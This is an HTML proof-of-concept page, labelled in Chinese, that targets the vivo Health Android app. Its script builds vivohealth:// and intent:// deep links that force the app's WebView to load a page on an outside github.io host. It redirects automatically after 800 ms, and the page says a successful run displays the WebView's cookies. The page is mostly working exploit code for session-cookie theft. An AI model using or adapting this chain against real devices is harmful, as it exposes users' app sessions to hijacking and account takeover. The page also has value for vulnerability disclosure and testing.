<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>vivo health poc</title>
  <style>
    #open {
      font-size: 20px;
      padding: 14px 18px;
      background: #1677ff;
      color: white;
      text-decoration: none;
      border-radius: 6px;
      display: inline-block;
    }
    #out {
      white-space: pre-wrap;
      word-break: break-all;
      margin-top: 16px;
    }
  </style>
</head>
<body>
  <h3>vivo 健康 Cookie PoC</h3>
  <p>点击按钮后跳转 vivo 健康，成功后会在 App WebView 页面显示 Cookie。</p>

  <a id="open">打开 vivo 健康</a>
  <pre id="out"></pre>

  <script>
    // 目标链接
    const payloadUrl = 'https://allen10086.github.io/src.html';
    
    // 【修复】vivo 健康标准 scheme 格式
    const schemeUrl = `vivohealth://web?url=${encodeURIComponent(payloadUrl)}`;

    // 【修复】标准 Intent 格式
    const intentUrl = `intent://web?url=${encodeURIComponent(payloadUrl)}#Intent;scheme=vivohealth;package=com.vivo.health;end;`;

    // 展示链接
    const out = document.getElementById('out');
    out.textContent = 'schemeUrl:\n' + schemeUrl + '\n\nintentUrl:\n' + intentUrl;

    // 绑定点击
    const openBtn = document.getElementById('open');
    openBtn.href = intentUrl;

    // 自动跳转（部分浏览器需要手动点击）
    setTimeout(() => {
      window.location.href = intentUrl;
    }, 800);
  </script>
</body>
</html>
